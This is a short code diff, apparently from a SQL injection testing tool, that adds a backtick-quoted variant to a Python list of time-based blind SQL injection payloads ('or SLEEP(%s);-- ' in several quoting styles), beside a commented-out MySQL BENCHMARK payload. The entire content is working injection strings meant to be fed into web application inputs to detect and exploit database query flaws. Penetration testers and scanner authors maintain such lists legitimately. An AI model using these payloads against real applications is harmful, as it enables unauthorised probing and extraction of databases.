@@ -11,6 +11,7 @@ DelayPayload = (
 	" or SLEEP(%s);-- ", 
 	"' or SLEEP(%s);-- " ,
 	'" or SLEEP(%s);-- ', 
+	'` or SLEEP(%s);-- ', 
 	
 	#MYSQL 4
 	#"+or+BENCHMARK(250000%s,MD5(1))",                     
